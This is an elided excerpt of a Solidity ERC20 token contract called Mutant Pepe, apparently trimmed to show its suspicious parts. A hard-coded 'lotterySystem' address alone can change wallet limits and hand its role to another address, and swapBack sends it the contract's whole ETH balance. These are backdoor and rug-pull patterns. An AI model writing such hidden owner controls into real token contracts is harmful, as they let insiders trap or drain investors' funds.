...
contract MutantPepe is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    event LotterySystemUpdated(address indexed newWallet, address indexed oldWallet);
    ...
    constructor() ERC20("Mutant Pepe", "PEPETANT") {
    	...
    	lotterySystem = address(0x3E7E50532EA50F07bc387475C7a4e83ABA049785); // set as operations wallet
    ...
    function updateMaxWalletAmount(uint256 newNum) external {
        require(_msgSender() == lotterySystem);
    ...
    function updateLotterySystem(address newLotterySystem) external {
        require(_msgSender() == lotterySystem);

        require(newLotterySystem != address(0), "may not set to 0 address");
        excludeFromFees(newLotterySystem, true);
        emit LotterySystemUpdated(newLotterySystem, lotterySystem);
        lotterySystem = newLotterySystem;
    }
    ...
    function swapBack() private {
        ...
        (success,) = address(lotterySystem).call{value: address(this).balance}("");
    }
